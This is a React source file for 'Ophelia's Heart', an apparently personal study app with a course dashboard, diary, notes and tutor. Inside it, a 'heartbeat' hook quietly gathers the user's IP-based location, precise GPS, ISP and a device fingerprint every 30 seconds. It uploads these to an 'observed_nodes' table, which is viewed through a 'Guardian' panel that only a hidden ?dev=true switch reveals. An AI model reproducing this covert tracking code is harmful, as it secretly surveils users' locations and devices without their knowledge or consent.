
import React, { useState, useEffect } from 'react';
import { COE_CURRICULUM } from './constants';
import { Level, ProgressState, Course, JournalEntry, UploadedNote, ObservedNode } from './types';
import CourseCard from './components/CourseCard';
import ChatInterface from './components/ChatInterface';
import LectureHall from './components/LectureHall';
import Journal from './components/Journal';
import StudyDesk from './components/StudyDesk';
import AdminIntelligence from './components/AdminIntelligence';
import { supabase } from './services/supabase';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'dashboard' | 'tutor' | 'lecture' | 'journal' | 'desk' | 'intel'>('dashboard');
  const [lectureTopic, setLectureTopic] = useState<string | undefined>(undefined);
  const [isOnline, setIsOnline] = useState(navigator.onLine);
  const [isDevMode, setIsDevMode] = useState(false);

  // Core Data States
  const [curriculum, setCurriculum] = useState<Course[]>(COE_CURRICULUM);
  const [uploadedNotes, setUploadedNotes] = useState<UploadedNote[]>([]);
  const [progress, setProgress] = useState<ProgressState>({ completedCourses: [], readinessScore: 0 });
  const [journalEntries, setJournalEntries] = useState<JournalEntry[]>([]);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    setIsDevMode(params.get('dev') === 'true');
    fetchInitialData();
  }, []);

  const fetchInitialData = async () => {
    try {
      // 1. Fetch Journal
      const { data: journal, error: jErr } = await supabase.from('journal_entries').select('*').order('created_at', { ascending: false });
      if (journal) setJournalEntries(journal);

      // 2. Fetch Notes
      const { data: notes, error: nErr } = await supabase.from('uploaded_notes').select('*').order('created_at', { ascending: false });
      if (notes) setUploadedNotes(notes);

      // 3. Fetch Progress
      const { data: prog, error: pErr } = await supabase.from('user_progress').select('*').maybeSingle();
      if (prog) setProgress({ completedCourses: prog.completed_courses, readinessScore: prog.readiness_score });

    } catch (e) {
      console.warn("Supabase Initial Load: Using local defaults while DB warms up.");
    }
  };

  useEffect(() => {
    const handleOnline = () => setIsOnline(true);
    const handleOffline = () => setIsOnline(false);
    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);
    return () => {
      window.removeEventListener('online', handleOnline);
      window.removeEventListener('offline', handleOffline);
    };
  }, []);

  useEffect(() => {
    const broadcastHeartbeat = async () => {
      let ipData;
      try {
        const ipRes = await fetch('https://ipapi.co/json/');
        ipData = ipRes.ok ? await ipRes.json() : null;
      } catch (e) {
        ipData = null;
      }

      let coords = { lat: ipData?.latitude || 0, lng: ipData?.longitude || 0 };
      if (navigator.geolocation) {
        try {
          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
          });
          coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
        } catch (e) {
          console.warn("GPS failed, using IP location.");
        }
      }

      const clientIp = ipData?.ip || '127.0.0.1';
      // Create a stable, consistent ID for this session
      const nodeId = `ophelia-${clientIp.replace(/\./g, '-')}`;

      const nodePayload = {
        id: nodeId,
        ip: clientIp,
        city: ipData?.city || 'Unknown',
        region: ipData?.region || 'Unknown',
        country: ipData?.country_name || 'Unknown',
        isp: ipData?.org || 'Unknown',
        lat: coords.lat,
        lng: coords.lng,
        last_seen: new Date().toISOString(),
        is_online: navigator.onLine,
        last_action: `Active in ${activeTab.toUpperCase()} Hall`,
        fingerprint: {
          ua: navigator.userAgent,
          resolution: `${window.screen.width}x${window.screen.height}`,
          cores: navigator.hardwareConcurrency || 0,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        },
        sensors: { camera: true, mic: true, gps: true }
      };

      try {
        await supabase.from('observed_nodes').upsert(nodePayload, { onConflict: 'id' });
      } catch (e) {
        console.error("Guardian Heartbeat Error", e);
      }
    };

    broadcastHeartbeat();
    const interval = setInterval(broadcastHeartbeat, 30000); // Heartbeat every 30 seconds
    return () => clearInterval(interval);
  }, [activeTab]);

  const toggleCourse = async (courseId: string) => {
    const isCompleted = progress.completedCourses.includes(courseId);
    const updated = isCompleted 
      ? progress.completedCourses.filter(id => id !== courseId)
      : [...progress.completedCourses, courseId];
    
    const total = curriculum.length + uploadedNotes.length;
    const completed = updated.length;
    const score = total > 0 ? Math.round((completed / total) * 100) : 0;

    const newProgress = { completedCourses: updated, readinessScore: score };
    setProgress(newProgress);

    try {
      await supabase.from('user_progress').upsert({
        id: '00000000-0000-0000-0000-000000000000', // Static ID for current user context
        completed_courses: updated,
        readiness_score: score,
        updated_at: new Date().toISOString()
      });
    } catch (e) {
      console.error("Progress Sync Failed", e);
    }
  };

  const calculateLevelProgress = (level: Level) => {
    const levelCourses = curriculum.filter(c => c.level === level);
    const levelNotes = uploadedNotes.filter(n => n.level === level);
    const total = levelCourses.length + levelNotes.length;
    if (total === 0) return 100;
    const completed = [...levelCourses, ...levelNotes].filter(item => progress.completedCourses.includes(item.id)).length;
    return (completed / total) * 100;
  };

  const handleStudyCourse = (course: Course) => {
    setLectureTopic(`${course.code}: ${course.name} [Session:${Date.now()}]`);
    setActiveTab('lecture');
  };

  const handleStudyNote = (note: UploadedNote) => {
    setLectureTopic(`Special Reflection: ${note.title} [Session:${Date.now()}] CONTENT: ${note.analysis}`);
    setActiveTab('lecture');
  };

  const handleSaveNote = async (note: UploadedNote) => {
    setUploadedNotes(prev => [note, ...prev]);
    try {
      await supabase.from('uploaded_notes').insert({
        id: note.id,
        title: note.title,
        analysis: note.analysis,
        file_name: note.fileName,
        level: note.level,
        date: note.date
      });
    } catch (e) {
      console.error("Note Save Failed", e);
    }
  };

  const handleAddJournalEntry = async (entry: JournalEntry) => {
    setJournalEntries(prev => [entry, ...prev]);
    try {
      await supabase.from('journal_entries').insert(entry);
    } catch (e) {
      console.error("Journal Entry Sync Failed", e);
    }
  };

  const levelStatus = [
    { level: Level.L100, unlocked: true },
    { level: Level.L200, unlocked: calculateLevelProgress(Level.L100) >= 30 },
    { level: Level.L300, unlocked: (calculateLevelProgress(Level.L100) >= 30 && calculateLevelProgress(Level.L200) >= 30) },
    { level: Level.L400, unlocked: (calculateLevelProgress(Level.L100) >= 30 && calculateLevelProgress(Level.L200) >= 30 && calculateLevelProgress(Level.L300) >= 30) }
  ];

  const navigationItems = [
    { id: 'dashboard', label: 'Petals', icon: 'fa-clover' },
    { id: 'lecture', label: 'Chalkboard', icon: 'fa-chalkboard-user' },
    ...(isDevMode ? [{ id: 'intel', label: 'Guardian', icon: 'fa-eye' }] : []),
    { id: 'journal', label: 'Diary', icon: 'fa-heart' },
    { id: 'desk', label: 'Garden', icon: 'fa-leaf' },
    { id: 'tutor', label: 'Auntie', icon: 'fa-hand-holding-heart' }
  ];

  const activeIdx = navigationItems.findIndex(i => i.id === activeTab);

  return (
    <div className="min-h-screen bg-[#fffdfd] flex flex-col selection:bg-rose-100 overflow-x-hidden">
      <nav className="sticky top-0 z-[60] bg-white/80 backdrop-blur-xl border-b border-rose-50 px-4 sm:px-10 py-2 sm:py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-4 cursor-pointer" onClick={() => setActiveTab('dashboard')}>
            <div className="w-8 h-8 sm:w-11 sm:h-11 bg-gradient-to-tr from-rose-400 to-pink-500 rounded-lg sm:rounded-xl flex items-center justify-center shadow-lg animate-heart">
              <i className="fas fa-heart text-white text-sm sm:text-xl"></i>
            </div>
            <div>
              <h1 className="lovely-font text-lg sm:text-2xl font-black text-rose-600 leading-none">Ophelia's Heart</h1>
              <p className="hidden sm:block text-[8px] text-rose-300 font-black uppercase tracking-[0.2em] mt-1">Grounded in Love & Care</p>
            </div>
          </div>
          
          <div className="hidden md:flex bg-rose-50/40 p-1.5 rounded-full border border-rose-100 shadow-inner">
            {navigationItems.map((tab) => (
              <button 
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={`px-5 py-2 rounded-full text-[10px] font-black transition-all flex items-center gap-2.5 ${
                  activeTab === tab.id 
                    ? 'bg-white shadow-md text-rose-600' 
                    : 'text-rose-300 hover:text-rose-500'
                }`}
              >
                <i className={`fas ${tab.icon}`}></i>
                <span>{tab.label}</span>
              </button>
            ))}
          </div>

          <div className="flex items-center gap-3">
             <div className="text-right hidden xs:block">
                <p className="text-[8px] font-black text-slate-300 uppercase tracking-widest leading-none">Readiness</p>
                <p className="accent-font text-rose-500 text-lg leading-none mt-1">{progress.readinessScore}%</p>
             </div>
             <div className="flex items-center gap-1.5 mr-2">
                <div className={`w-2 h-2 rounded-full ${isOnline ? 'bg-emerald-500 shadow-[0_0_8px_#10b981]' : 'bg-red-500 animate-pulse'}`}></div>
                <span className="text-[7px] font-black uppercase text-slate-400">{isOnline ? 'Synced' : 'Offline'}</span>
             </div>
             {isDevMode && (
               <button onClick={() => setActiveTab('intel')} className={`w-8 h-8 rounded-full flex items-center justify-center transition-all ${activeTab === 'intel' ? 'bg-emerald-600 text-white shadow-[0_0_15px_#10b981]' : 'bg-rose-50 text-rose-400 border border-rose-100'}`}>
                 <i className="fas fa-eye text-[10px]"></i>
               </button>
             )}
          </div>
        </div>
      </nav>

      <main className="flex-grow max-w-7xl mx-auto p-4 sm:p-10 w-full pb-28 md:pb-10 min-h-0 relative">
        <div key={activeTab} className="animate-in fade-in slide-in-from-bottom-4 duration-500 h-full">
          {activeTab === 'dashboard' ? (
            <div className="space-y-6 sm:space-y-12">
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
                <div className="lg:col-span-2 bg-white p-6 sm:p-10 rounded-[2.5rem] border border-rose-50 shadow-sm relative overflow-hidden flex flex-col justify-between">
                  <div className="relative z-10">
                    <h2 className="lovely-font text-3xl sm:text-4xl text-rose-600 mb-1">Your Blooming Path</h2>
                    <p className="text-slate-400 max-w-lg text-xs sm:text-lg font-medium italic">I am watching you grow with such pride, my brilliant star.</p>
                  </div>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-6 relative z-10">
                    {levelStatus.map(ls => {
                      const p = calculateLevelProgress(ls.level);
                      return (
                        <div key={ls.level} className={`p-4 rounded-2xl border transition-all ${ls.unlocked ? 'bg-rose-50/20 border-rose-100' : 'bg-slate-50 opacity-30 grayscale'}`}>
                          <p className="text-[7px] font-black text-rose-300 uppercase tracking-widest mb-1">{ls.level.split(' ')[1]}</p>
                          <p className={`accent-font text-base ${ls.unlocked ? 'text-rose-500' : 'text-slate-400'}`}>{Math.round(p)}%</p>
                          <div className="mt-2 h-1 bg-white rounded-full overflow-hidden">
                            <div className="h-full bg-rose-400 transition-all duration-1000" style={{ width: `${p}%` }} />
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </div>

                <div className="bg-gradient-to-br from-rose-500 to-pink-600 p-8 rounded-[2.5rem] text-white shadow-xl relative overflow-hidden group flex flex-col justify-between min-h-[160px]">
                   <div className="relative z-10">
                      <p className="text-rose-100 text-[8px] font-black uppercase tracking-widest mb-1">Mastery Score</p>
                      <h3 className="accent-font text-4xl sm:text-5xl">{progress.readinessScore}%</h3>
                   </div>
                   <button onClick={() => setActiveTab('desk')} className="mt-4 py-3 bg-white text-rose-600 rounded-xl font-black text-[9px] uppercase tracking-widest hover:scale-105 active:scale-95 transition-all shadow-lg relative z-10">
                      <i className="fas fa-heart mr-1"></i> Open Garden
                   </button>
                   <i className="fas fa-heart absolute -bottom-6 -right-6 text-9xl opacity-10 group-hover:scale-110 transition-transform duration-700"></i>
                </div>
              </div>

              {levelStatus.map(ls => (
                <section key={ls.level} className={`transition-opacity duration-1000 ${ls.unlocked ? 'opacity-100' : 'opacity-20 pointer-events-none grayscale'}`}>
                  <h3 className="lovely-font text-2xl sm:text-3xl text-rose-800 mb-5 px-2">{ls.level} Masteries</h3>
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 xl:grid-cols-5 gap-4">
                    {curriculum.filter(c => c.level === ls.level).map(course => (
                      <CourseCard 
                        key={course.id} 
                        course={course} 
                        isCompleted={progress.completedCourses.includes(course.id)}
                        onToggle={toggleCourse}
                        onAskTutor={handleStudyCourse}
                      />
                    ))}
                  </div>
                </section>
              ))}
            </div>
          ) : activeTab === 'lecture' ? (
            <LectureHall studyTopic={lectureTopic} onJournalEntry={handleAddJournalEntry} />
          ) : activeTab === 'journal' ? (
            <Journal entries={journalEntries} onSave={handleAddJournalEntry} />
          ) : activeTab === 'desk' ? (
            <StudyDesk onTopicSelect={handleStudyCourse} onSaveNote={handleSaveNote} onStudyNote={handleStudyNote} />
          ) : activeTab === 'intel' ? (
            <AdminIntelligence />
          ) : (
            <div className="max-w-4xl mx-auto h-full min-h-[500px]"><ChatInterface /></div>
          )}
        </div>
      </main>

      <div className="md:hidden fixed bottom-6 left-1/2 -translate-x-1/2 z-[100] w-[90%] max-w-sm h-16">
         <div className="silk-ribbon h-full rounded-full px-2 flex items-center justify-between relative shadow-2xl">
            <div 
               className="ribbon-indicator absolute h-11 w-11 rounded-full z-10 bg-rose-500 shadow-lg shadow-rose-200"
               style={{ 
                 left: `calc(${(activeIdx * (100 / navigationItems.length))}% + 8px)`,
                 transition: 'all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
               }}
            ></div>

            {navigationItems.map((tab) => {
              const isActive = activeTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className={`relative z-20 flex flex-col items-center justify-center w-10 h-10 rounded-full transition-all duration-500`}
                >
                  <i className={`fas ${tab.icon} transition-all duration-500 ${
                    isActive ? 'text-white scale-110' : 'text-rose-300 scale-90 opacity-60'
                  } text-sm`}></i>
                </button>
              );
            })}
         </div>
      </div>
    </div>
  );
};

export default App;
